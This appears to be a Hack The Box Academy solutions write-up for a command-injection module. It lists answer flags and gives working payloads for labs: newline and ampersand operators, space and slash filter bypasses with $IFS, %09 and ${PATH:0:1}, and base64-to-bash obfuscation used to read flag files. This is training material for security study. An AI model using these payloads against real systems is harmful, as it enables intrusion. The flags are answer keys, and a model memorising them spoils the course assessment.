
| Section | Question Number | Answer |
| --- | --- | --- |
| Detection | Question 1 | Please match the requested format. |
| Injecting Commands | Question 1 | 17 |
| Other Injection Operators | Question 1 |  |
| Identifying Filters | Question 1 | new-line |
| Bypassing Space Filters | Question 1 | 1613 |
| Bypassing Other Blacklisted Characters | Question 1 | 1nj3c70r |
| Bypassing Blacklisted Commands | Question 1 | HTB{b451c\_f1l73r5\_w0n7\_570p\_m3} |
| Advanced Command Obfuscation | Question 1 | /usr/share/mysql/debian\_create\_root\_user.sql |
| Skills Assessment | Question 1 | HTB{c0mm4nd3r\_1nj3c70r} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Detection

## Question 1

### "Try adding any of the injection operators after the ip in IP field. What did the error message say?"

After spawning the target machine and visiting its website's root webpage, students need to provide `;` as input to the IP field to get the error message `Please match the requested format.`:

![[HTB Solutions/CBBH/z. images/d674df965fc1e117e2fb32d7fe718421_MD5.jpg]]

Answer: `Please match the requested format.`

# Injecting Commands

## Question 1

### "Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?"

After spawning the target machine and visiting its website's root webpage, students need to view its source by clicking `CTRL` + `U` to then find the Regex pattern on line 17:

![[HTB Solutions/CBBH/z. images/0b41c42ad08580d8b0856088d5cbf2e3_MD5.jpg]]

Answer: `17`

# Other Injection Operators

## Question 1

### "Try the using remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?"

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button and try the three operators. Students will find out that the `|` operators is the one that shows the output of the injected command:

![[HTB Solutions/CBBH/z. images/510fc9dbceb591600ac85493928ef4cb_MD5.jpg]]

Additionally, students can refer to the `Command Injection Methods` table in the `Detection` section to find that the `Pipe` operator shows only the second output:

![[HTB Solutions/CBBH/z. images/48d95ce7bac0c425814f225f14221407_MD5.jpg]]

Answer: `|`

# Identifying Filters

## Question 1

### "Try all other injection operators (new-line, &, |), to see if any of them is not blacklisted. Which operator is not blacklisted by the web application?"

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button and try the three operators. Students will find out that the `new-line` (i.e., `%0a`) character is not blacklisted:

Code: shell

```shell
127.0.0.1%0a
```

![[HTB Solutions/CBBH/z. images/506291ba4d9a050d054a565cdc4c363d_MD5.jpg]]

Answer: `new-line`

# Bypassing Space Filters

## Question 1

### "Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?"

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button. Students can use payloads that bypass the space filters such as `$IFS` or `%09`:

```
ls$IFS-la
ls%09-la
```

Using `ls$IFS-la`, students will find out that size of `index.php` is `1613` (bytes):

![[HTB Solutions/CBBH/z. images/f90ddd8f236c9ce264f99f1f75ad7620_MD5.jpg]]

Answer: `1613`

# Bypassing Other Blacklisted Characters

## Question 1

### "Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?"

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button. Students can use payloads that bypass the space filters such as `$IFS` or `%09` and `${PATH:0:1}` to bypass the forward slash character filter, finding the user `1nj3c70r`:

```
ip=127.0.0.1%0als$IFS${PATH:0:1}home
```

![[HTB Solutions/CBBH/z. images/fa8a02f542e2360bcdba895e7d56f899_MD5.jpg]]

Answer: `1nj3c70r`

# Bypassing Blacklisted Commands

## Question 1

### "Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found."

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button. Students can use payloads that bypass the space filters such as `$IFS` or `%09`, `${PATH:0:1}` to bypass the forward slash character filter, and add two apostrophes on the `cat` command to bypass its blacklisting filter such that it becomes `c'a't`. Students will attain the flag `HTB{b451c_f1l73r5_w0n7_570p_m3}`:

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

![[HTB Solutions/CBBH/z. images/d3e3f1eb7e48b93cf744c07f38950e87_MD5.jpg]]

Answer: `HTB{b451c_f1l73r5_w0n7_570p_m3}`

# Advanced Command Obfuscation

## Question 1

### "Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1"

After spawning the target machine and visiting its website's root webpage, students need to use `Burp Suite` or `ZAP` to intercept the request made after clicking the `Check` button. Since the `pipe` operator is in the command, students need to use the third method which encodes all characters. Thus, students first need to base64-encode the command:

Code: shell

```shell
echo -n 'find /usr/share/ | grep root | tail -n 1' | base64
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64

ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

Subsequently, students then need to create a command that will decode the encoded base64 string in a sub-shell and then pass it to `bash` to be executed:

```
bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

At last, students need to bypass the space character filter by using either `%09` or `$IFS`, use the `new-line` operator `%0a` to separate the payload from the IP address, and forward the modified intercepted request. Students will attain the output `/usr/share/mysql/debian_create_root_user.sql`:

```
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

![[HTB Solutions/CBBH/z. images/08c1ae54f5e33f1e5a8417dd4163ab84_MD5.jpg]]

Answer: `/usr/share/mysql/debian_create_root_user.sql`

# Skills Assessment

## Question 1

### "What is the content of '/flag.txt'?"

After spawning the target machine, students need to navigate to its website's root webpage and login with the credentials `guest:guest`:

![[HTB Solutions/CBBH/z. images/6d240eaebe2775f692951ebb38e00fa6_MD5.jpg]]

Once signed in to the web-based file manager, students will find several files and a folder, with the former having four clickable buttons, `Preview`, `Copy to...`, `Direct link`, and `Download`. Out of the four, the `Copy to...` button seems the most plausible to be an attack vector, as the backend will need to use system commands such as `mv`, `move`, or `cp`. Clicking on `Copy to...` on a file will redirect students to a new page with two main options `Copy` and `Move`, while also being able to choose the destination folder:

![[HTB Solutions/CBBH/z. images/2676eb37e67448675f14cf5ecbe9fff1_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/4cc748c39ae3afd004ca25b51d5f7dc1_MD5.jpg]]

If students select the destination folder `tmp` and click on `Copy`, injecting characters in the URL, no indication of command execution will appear. Therefore, students need to test the `Move` functionality. Clicking `Move` on a file without the selecting the `tmp` folder as the destination folder will throw the following error:

![[HTB Solutions/CBBH/z. images/824c23ffe47e4d0a9ddda9b692aff201_MD5.jpg]]

Thus, most probably, the backend is using a `mv` command, and if an error occurs, it prints it out; therefore, this may be abused to capture command output, however, students need to ensure that the original `mv` command fails, otherwise error messages may not be displayed. Additionally, students need to use an injection operator that will show either both or only the second command, even if the first fails, which rules out the operator `&&`, however, any other operator may be used.

Students then need to run `Burp Suite`, set `FoxyProxy` to the preconfigured option "BURP", and then click on `Move` with no destination folder to move a file, same as done previously:

![[HTB Solutions/CBBH/z. images/000aa7f1a6bbf7ca8f9634ebf56fbc0c_MD5.jpg]]

Students need to send the intercepted request to `Repeater` (`Ctrl` + `R`) and send the request:

![[HTB Solutions/CBBH/z. images/4f4c75c6c4448558178fb01a0374d140_MD5.jpg]]

After receiving the response, students will find the same error message in line 732:

![[HTB Solutions/CBBH/z. images/9220a479a7e15fc14effc4ceca6979c4_MD5.jpg]]

Students will notice that there are two GET parameters being passed in the request, `to` and `from`. Trying to inject different injection operators in both parameters, students will receive the error message "Malicious request denied!":

![[HTB Solutions/CBBH/z. images/a43de9506987b31bb37c8825d239e71f_MD5.jpg]]

However, when injecting the `&` operator, students will notice that it passes by, as the developers may have thought that it is required for URLs, and thus whitelisted it:

![[HTB Solutions/CBBH/z. images/b3d989562da9af8978c78b68ffc99ae2_MD5.jpg]]

Thus, students need to use this injection operator, however, it must be URL encoded, i.e., `%26`. Subsequently, students need to determine which parameter to be used for the injections, and in this case, either can be used, since both constitute the command being run by the backend, as seen by the printed error previously. Students need to inject `& cat /flag.txt` to read the flag file; to bypass white-space, students can either use `$IFS` or `%09`, and to bypass slashes, students need to use `${PATH:0:1}`, therefore, the payload can either be `$IFS%26c"a"t$IFS${PATH:0:1}flag.txt`, or `$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)`.

With the former payload, the URL parameters will be `/index.php?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=51459716.txt&finish=1&move=1`:

![[HTB Solutions/CBBH/z. images/45f5cb5d12b63efd0a42d00f63035ff6_MD5.jpg]]

While with the the latter payload, the URL parameters will be `/index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=51459716.txt&finish=1&move=1`. Students will attain the flag `HTB{c0mm4nd3r_1nj3c70r}` with either payloads.:

![[HTB Solutions/CBBH/z. images/82d6f9162c64e27dc7f3bfe7077eb2e1_MD5.jpg]]

Answer: `HTB{c0mm4nd3r_1nj3c70r}`